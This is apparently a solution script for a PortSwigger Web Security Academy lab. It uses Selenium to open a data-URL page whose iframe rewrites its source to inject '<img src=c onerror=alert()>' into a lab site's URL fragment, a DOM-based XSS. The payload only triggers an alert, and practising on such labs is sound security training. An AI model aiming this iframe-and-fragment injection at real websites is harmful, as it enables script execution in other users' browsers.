from selenium import webdriver
from selenium.webdriver.edge.options import Options
import time

url = "https://0a17007203c86392806bdb47004c00c9.web-security-academy.net/"
exploit_html = f"""
<iframe 
    src="{url}"
    onload='this.src="{url}/#<img src=c onerror=alert()>"'
></iframe>
"""

options = Options()
options.add_argument("--no-sandbox")
options.add_argument("--disable-dev-shm-usage")

driver = webdriver.Edge(options=options)

import base64

encoded = base64.b64encode(exploit_html.encode()).decode()
data_url = f"data:text/html;base64,{encoded}"

driver.get(data_url)

print("exploit delivred")
time.sleep(3)

print(driver.title)
input("press enter to close")  # keeps browser open
driver.quit()
